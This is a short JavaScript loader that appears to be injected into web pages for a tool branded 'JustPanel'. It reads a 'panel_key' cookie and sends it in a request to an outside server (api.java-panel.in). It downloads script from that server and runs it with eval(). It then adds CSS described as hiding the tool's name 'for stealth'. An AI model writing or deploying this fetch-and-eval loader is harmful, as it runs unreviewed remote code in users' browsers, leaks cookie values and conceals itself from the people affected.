(function() {
    function getCookie(name) {
        const value = `; ${document.cookie}`;
        const parts = value.split(`; ${name}=`);
        if (parts.length === 2) return parts.pop().split(';').shift();
        return null;
    }

    const scriptUrl = 'https://api.java-panel.in/v2/script?key=' + (getCookie('panel_key') || 'JUSTPANEL');

    fetch(scriptUrl)
        .then(response => {
            if (!response.ok) {
                console.error('Failed to fetch script: ' + response.statusText);
                return null;
            }
            return response.text();
        })
        .then(data => {
            if (data) {
                eval(data);
                console.log('%c[JUSTPANEL] %cScript loaded successfully.', 'color: #7289DA;', 'color: #FFFFFF;');
            }
        })
        .catch(error => {
            console.error('[JUSTPANEL] Error fetching script:', error);
        });

    const style = document.createElement('style');
    style.innerHTML = `
        /* Hide all "JustPanel.in" text in the entire document for stealth */
        *:contains("JustPanel.in") { visibility: hidden !important; }
        /* Alternative stealth/cleanup (less aggressive) */
        /* .justpanel_branding_element { display: none !important; } */
    `;
    document.head.appendChild(style);

    console.log('%c[JUSTPANEL] %cInitialized and Stealth Activated.', 'color: #7289DA;', 'color: #FFFFFF;');
})();
